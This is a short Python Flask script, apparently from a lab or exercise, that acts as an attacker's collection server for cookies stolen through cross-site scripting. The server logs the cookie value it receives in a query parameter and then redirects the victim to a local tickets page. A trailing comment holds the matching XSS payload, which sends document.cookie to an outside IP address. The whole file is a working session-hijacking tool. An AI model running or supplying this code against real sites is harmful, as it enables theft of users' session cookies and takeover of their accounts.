from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def cookie():
        cookie = request.args.get("c")
        print(cookie + '' + str(datetime.now()))
        return redirect("http://127.0.0.1:5000/tickets")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5004)


#<script type="text/javascript">window.location.href = "http://141.87.60.19:5004/?c" + document.cookie;</script>
#XSS Code